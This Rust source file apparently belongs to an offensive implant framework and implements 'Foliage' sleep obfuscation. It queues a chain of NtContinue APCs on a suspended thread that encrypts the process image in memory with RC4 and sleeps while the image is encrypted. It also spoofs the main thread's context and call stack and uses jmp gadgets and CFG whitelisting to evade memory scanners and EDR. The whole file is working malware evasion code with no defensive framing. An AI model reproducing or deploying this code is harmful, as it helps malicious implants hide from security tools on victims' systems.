//! APC-based sleep obfuscation using a dedicated suspended thread.
//!
//! Foliage queues the 10-step NtContinue context chain as APCs on a suspended thread
//! via `NtQueueApcThread`. When `NtAlertResumeThread` is called, the thread wakes in
//! an alertable state and executes all queued APCs in FIFO order - no timing required.
//!
//! Unlike Ekko/Zilean, Foliage does not use a thread pool. The APC thread terminates
//! itself via `RtlExitUserThread` in step 9 instead of signaling an event.
//! Uses only 1 event for synchronization.

use {
    crate::common::{
        current_rsp, find_jmp_gadgets, init_spoof_config, jmp_ctx, set_valid_call_targets,
        spoof_context, spoof_stack_layout, SpoofKind,
    },
    api::{api::Api, windows::*, NT_SUCCESS},
    core::{ffi::c_void, mem::zeroed, ptr::null_mut},
};

/// Register all NT function pointers used by Foliage as valid CFG call targets.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (must include ntdll handles).
#[link_section = ".text$D"]
#[rustfmt::skip]
unsafe fn handle_cfg(api: &mut Api) {
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtContinue_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtWaitForSingleObject_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtProtectVirtualMemory_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtGetContextThread_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtSetContextThread_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtSetEvent_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtQueueApcThread_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtCreateThreadEx_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.NtAlertResumeThread_ptr as *mut c_void);
    set_valid_call_targets(api, api.ntdll.handle as _, api.ntdll.RtlExitUserThread_ptr as *mut c_void);
}

/// Execute the Foliage sleep obfuscation chain using APC queuing.
///
/// Creates a suspended thread, queues 10 NtContinue-based APCs for the
/// encrypt-sleep-decrypt chain, then resumes the thread so APCs fire in FIFO
/// order. The main thread blocks on `NtSignalAndWaitForSingleObject` until the
/// APC thread exits.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers and sleep context (`api.sleep` must contain
///   valid image base, length, and sleep duration).
///
/// # Safety
///
/// All `Api` function pointers must be resolved. The caller must ensure the process
/// image base/length in `api.sleep` are valid and that no other thread is modifying
/// the image concurrently.
#[link_section = ".text$D"]
#[rustfmt::skip]
unsafe fn foliage(api: &mut Api) {
    api::log_info!(b"[FOLIAGE] foliage: enter");

    handle_cfg(api);

    let scfg = init_spoof_config(api);
    if scfg.is_none() {
        api::log_info!(b"[FOLIAGE] init_spoof_config failed");
        return;
    }
    let scfg = scfg.unwrap();

    let jmp_gadget = find_jmp_gadgets(api);
    if jmp_gadget.is_none() {
        api::log_info!(b"[FOLIAGE] find_jmp_gadgets failed");
        return;
    }
    let jmp_gadget = jmp_gadget.unwrap();

    let mut event = null_mut();
    let status = api.ntdll.NtCreateEvent(
        &mut event, EVENT_ALL_ACCESS, null_mut(),
        EVENT_TYPE::SynchronizationEvent, 0,
    );
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[FOLIAGE] NtCreateEvent failed", status);
        return;
    }

    // Create a suspended thread. Start address is a safe stub (TpReleaseCleanupGroup+0x250)
    // so if the thread wakes unexpectedly it won't crash. Flag 1 = CREATE_SUSPENDED.
    let mut h_thread = null_mut();
    let status = api.ntdll.NtCreateThreadEx(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        null_mut(),
        -1isize as HANDLE,
        (api.ntdll.TpReleaseCleanupGroup_ptr as *mut c_void).add(0x250),
        null_mut(),
        1,
        0,
        0x1000 * 20,
        0x1000 * 20,
        null_mut(),
    );
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[FOLIAGE] NtCreateThreadEx failed", status);
        api.ntdll.NtClose(event);
        return;
    }
    api::log_info!(b"[FOLIAGE] suspended thread created");

    // Capture the suspended thread's initial context
    let mut ctx_init: CONTEXT = zeroed();
    ctx_init.ContextFlags = CONTEXT_FULL;
    let status = api.ntdll.NtGetContextThread(h_thread, &mut ctx_init);
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[FOLIAGE] NtGetContextThread failed", status);
        api.ntdll.NtClose(h_thread);
        api.ntdll.NtClose(event);
        return;
    }
    api::log_info!(b"[FOLIAGE] thread context captured");

    let mut ctxs = [ctx_init; 10];

    // Get a real handle to the current (main) thread
    let mut thread = null_mut();
    let status = api.ntdll.NtDuplicateObject(
        -1isize as HANDLE,
        -2isize as HANDLE,
        -1isize as HANDLE,
        &mut thread,
        0, 0,
        DUPLICATE_SAME_ACCESS,
    );
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[FOLIAGE] NtDuplicateObject failed", status);
    }

    // Build spoofed main-thread context (Rip = ZwWaitForWorkViaWorkerFactory)
    ctx_init.Rsp = current_rsp();
    let mut ctx_spoof = spoof_context(api, &scfg, ctx_init);

    let mut base = api.sleep.buffer as PVOID;
    let mut size = api.sleep.length;
    let mut old_protect: DWORD = 0;
    let mut ctx_backup: CONTEXT = zeroed();
    ctx_backup.ContextFlags = CONTEXT_FULL;

    // Step 0: NtWaitForSingleObject(event) - gate until main signals
    jmp_ctx(&jmp_gadget, &mut ctxs[0], api.ntdll.NtWaitForSingleObject_ptr as u64);
    ctxs[0].Rcx = event as u64;
    ctxs[0].Rdx = 0;
    ctxs[0].R8 = 0;

    // Step 1: NtProtectVirtualMemory(RW) - make image writable
    jmp_ctx(&jmp_gadget, &mut ctxs[1], api.ntdll.NtProtectVirtualMemory_ptr as u64);
    ctxs[1].Rcx = -1isize as u64;
    ctxs[1].Rdx = &mut base as *mut _ as u64;
    ctxs[1].R8 = &mut size as *mut _ as u64;
    ctxs[1].R9 = PAGE_READWRITE as u64;

    // Step 2: SystemFunction040 (RC4 encrypt) - encrypt image in-place
    jmp_ctx(&jmp_gadget, &mut ctxs[2], api.advapi.SystemFunction040_ptr as u64);
    ctxs[2].Rcx = api.sleep.buffer as u64;
    ctxs[2].Rdx = api.sleep.length as u64;
    ctxs[2].R8 = 0;

    // Step 3: NtGetContextThread - save real main thread context to backup
    jmp_ctx(&jmp_gadget, &mut ctxs[3], api.ntdll.NtGetContextThread_ptr as u64);
    ctxs[3].Rcx = thread as u64;
    ctxs[3].Rdx = &mut ctx_backup as *mut _ as u64;

    // Step 4: NtSetContextThread - replace main context with spoofed idle context
    jmp_ctx(&jmp_gadget, &mut ctxs[4], api.ntdll.NtSetContextThread_ptr as u64);
    ctxs[4].Rcx = thread as u64;
    ctxs[4].Rdx = &mut ctx_spoof as *mut _ as u64;

    // Step 5: WaitForSingleObject(main_thread, sleep_ms) - THE ACTUAL SLEEP
    jmp_ctx(&jmp_gadget, &mut ctxs[5], api.kernel32.WaitForSingleObject_ptr as u64);
    ctxs[5].Rcx = thread as u64;
    ctxs[5].Rdx = api.sleep.dw_milliseconds as u64;

    // Step 6: SystemFunction041 (RC4 decrypt) - decrypt image
    jmp_ctx(&jmp_gadget, &mut ctxs[6], api.advapi.SystemFunction041_ptr as u64);
    ctxs[6].Rcx = api.sleep.buffer as u64;
    ctxs[6].Rdx = api.sleep.length as u64;
    ctxs[6].R8 = 0;

    // Step 7: NtProtectVirtualMemory(RX) - restore execute permission
    jmp_ctx(&jmp_gadget, &mut ctxs[7], api.ntdll.NtProtectVirtualMemory_ptr as u64);
    ctxs[7].Rcx = -1isize as u64;
    ctxs[7].Rdx = &mut base as *mut _ as u64;
    ctxs[7].R8 = &mut size as *mut _ as u64;
    ctxs[7].R9 = PAGE_EXECUTE_READ as u64;

    // Step 8: NtSetContextThread - restore real main thread context from backup
    jmp_ctx(&jmp_gadget, &mut ctxs[8], api.ntdll.NtSetContextThread_ptr as u64);
    ctxs[8].Rcx = thread as u64;
    ctxs[8].Rdx = &mut ctx_backup as *mut _ as u64;

    // Step 9: RtlExitUserThread(0) - terminate the APC thread cleanly.
    // Uses DIRECT Rip (no jmp gadget) because this is the final step and the
    // thread is about to die - no stack unwinding will occur after this.
    ctxs[9].Rip = api.ntdll.RtlExitUserThread_ptr as u64;
    ctxs[9].Rcx = 0;
    ctxs[9].Rdx = 0;

    // Apply fake stack layout with SpoofKind::Foliage (writes NtTestAlert at stack
    // top instead of BaseThreadInitThunk, matching APC delivery call chain)
    spoof_stack_layout(api, &mut ctxs, &scfg, SpoofKind::Foliage);

    // Patch 5th argument (&old_protect) at RSP+0x28 for NtProtectVirtualMemory calls
    ((ctxs[1].Rsp + 0x28) as *mut u64).write(&mut old_protect as *mut _ as u64);
    ((ctxs[7].Rsp + 0x28) as *mut u64).write(&mut old_protect as *mut _ as u64);

    // Queue all 10 APCs on the suspended thread (FIFO order guaranteed)
    api::log_info!(b"[FOLIAGE] queuing 10 APCs");
    for ctx in &mut ctxs {
        let status = api.ntdll.NtQueueApcThread(
            h_thread,
            api.ntdll.NtContinue_ptr as *mut c_void,
            ctx as *mut _ as *mut c_void,
            null_mut(),
            null_mut(),
        );
        if !NT_SUCCESS!(status) {
            api::log_info!(b"[FOLIAGE] NtQueueApcThread failed", status);
            return;
        }
    }

    // Resume the thread into alertable state - all APCs fire immediately in order
    let status = api.ntdll.NtAlertResumeThread(h_thread, null_mut());
    if !NT_SUCCESS!(status) {
        api::log_info!(b"[FOLIAGE] NtAlertResumeThread failed", status);
    }

    // Signal start event (unblocks step 0), wait for APC thread to exit (step 9 kills it)
    api::log_info!(b"[FOLIAGE] signaling chain start, waiting for thread exit");
    api.ntdll.NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());

    api::log_info!(b"[FOLIAGE] chain complete, cleaning up");
    api.ntdll.NtClose(event);
    api.ntdll.NtClose(h_thread);
    api.ntdll.NtClose(thread);
}

/// Fiber context passed to [`foliage_fiber`] - holds the API pointer and master fiber handle.
struct FiberContext {
    api: *mut Api,
    master: PVOID,
}

/// Fiber entry point that runs [`foliage`] on an isolated 1MB stack, then switches
/// back to the master fiber.
///
/// # Arguments
///
/// * `param` - Pointer to a [`FiberContext`] containing the `Api` pointer and master fiber handle.
unsafe extern "system" fn foliage_fiber(param: PVOID) {
    let ctx = param as *mut FiberContext;
    foliage(&mut *(*ctx).api);
    let switch: FnSwitchToFiber = core::mem::transmute((*(*ctx).api).kernel32.SwitchToFiber_ptr);
    switch((*ctx).master);
}

/// Run the Foliage sleep obfuscation chain inside a dedicated fiber.
///
/// Converts the current thread to a fiber, creates a new fiber with a 1MB stack,
/// executes [`foliage`] on it, then cleans up and converts back to a normal thread.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (must include kernel32 fiber functions and
///   all ntdll/advapi functions used by [`foliage`]).
///
/// # Safety
///
/// All `Api` function pointers must be resolved. Must be called from a thread that
/// has not already been converted to a fiber.
#[link_section = ".text$D"]
pub unsafe fn foliage_with_fiber(api: &mut Api) {
    let master = api.kernel32.ConvertThreadToFiber(null_mut());
    if master.is_null() {
        api::log_info!(b"[FOLIAGE] ConvertThreadToFiber failed");
        return;
    }

    let mut fiber_ctx = FiberContext {
        api: api as *mut Api,
        master,
    };

    let fiber = api.kernel32.CreateFiber(
        0x100000,
        Some(foliage_fiber),
        &mut fiber_ctx as *mut _ as PVOID,
    );

    if fiber.is_null() {
        api::log_info!(b"[FOLIAGE] CreateFiber failed");
        api.kernel32.ConvertFiberToThread();
        return;
    }

    api.kernel32.SwitchToFiber(fiber);
    api.kernel32.DeleteFiber(fiber);
    api.kernel32.ConvertFiberToThread();
}
